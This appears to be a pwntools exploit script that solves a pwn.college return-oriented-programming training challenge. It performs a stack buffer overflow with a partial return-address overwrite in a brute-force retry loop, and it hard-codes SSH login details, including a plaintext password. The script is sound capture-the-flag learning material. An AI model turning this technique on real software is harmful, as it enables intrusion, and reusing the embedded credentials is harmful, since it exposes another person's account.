from pwn import *

e = ELF('./babyrop_level12_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

while 1:
    try:
        p = s.run('/babyrop_level12_teaching1')
        # p = e.process(env={'LD_PRELOAD':libc.path})

        p.recvuntil(b'[LEAK]')
        p.recvuntil(b': ')
        rbp = int(p.recvuntil(b'.',drop=True),16)
        pay = b'A' * 0x68
        pay += p64(rbp - 8 + 0x70)
        pay += b'\x17\xac'
        # pay += (0xf5cde7).to_bytes(3,'little')

        # pause()
        p.sendafter(b'\n\n',pay)

        p.recvuntil(b'Exiting!\n')
        # p.interactive()
        x = p.recvuntil('}').strip().decode()
        # print(x)
        if 'win!' in x:
            print(x)
        else:continue
        p.interactive()
        break
    except KeyboardInterrupt:
        break
    except Exception as ex:
        p.close()
        print(ex)


p.interactive()